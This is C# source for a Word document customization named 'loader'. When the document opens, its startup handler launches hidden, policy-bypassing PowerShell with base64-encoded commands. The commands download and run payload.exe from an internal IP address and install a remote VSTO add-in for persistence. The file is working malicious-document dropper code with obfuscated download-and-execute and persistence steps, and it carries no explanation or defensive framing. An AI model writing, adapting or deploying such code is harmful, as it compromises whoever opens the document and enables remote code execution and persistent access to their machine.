using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Xml.Linq;
using Microsoft.Office.Tools.Word;
using Microsoft.VisualStudio.Tools.Applications.Runtime;
using Office = Microsoft.Office.Core;
using Word = Microsoft.Office.Interop.Word;

namespace loader
{
    public partial class ThisDocument
    {
        private void ThisDocument_Startup(object sender, System.EventArgs e)
        {
            string ps_deliver_and_run;
            ps_deliver_and_run = "/c powershell.exe -window hidden -nol -noni -nop -ep bypass -ec JAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADEANQAuADIANAAvAHAAYQB5AGwAbwBhAGQALgBlAHgAZQAiADsAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACQAdQByAGwALAAiACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAcABhAHkAbABvAGEAZAAuAGUAeABlACIAKQA7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAoACIAJABlAG4AdgA6AEEAUABQAEQAQQBUAEEAXABwAGEAeQBsAG8AYQBkAC4AZQB4AGUAIgApADsA";
            System.Diagnostics.Process.Start("cmd.exe", ps_deliver_and_run);

            string ps_install_persit;
            ps_install_persit = "/c powershell.exe -window hidden -nol -noni -nop -ep bypass -ec YwBkACAAIgAkAGUAbgB2ADoAYwBvAG0AbQBvAG4AcAByAG8AZwByAGEAbQBmAGkAbABlAHMAXABNAGkAYwByAG8AcwBvAGYAdAAgAFMAaABhAHIAZQBkAFwAVgBTAFQATwBcADEAMAAuADAAXAAiADsAJABwAGUAcgBzAGkAcwB0ACAAPQAgACIAaAB0AHQAcAA6AC8ALwAxADAALgAwAC4AMQA1AC4AMgA0AC8AcABlAHIAcwBpAHMAdAAvAHAAZQByAHMAaQBzAHQALgB2AHMAdABvACIAOwAuAFwAdgBzAHQAbwBpAG4AcwB0AGEAbABsAGUAcgAuAGUAeABlACAALwBpACAAJABwAGUAcgBzAGkAcwB0ADsA";
            System.Diagnostics.Process.Start("cmd.exe", ps_install_persit);
        }

        private void ThisDocument_Shutdown(object sender, System.EventArgs e)
        {
        }

        #region VSTO Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InternalStartup()
        {
            this.Startup += new System.EventHandler(ThisDocument_Startup);
            this.Shutdown += new System.EventHandler(ThisDocument_Shutdown);
        }

        #endregion
    }
}
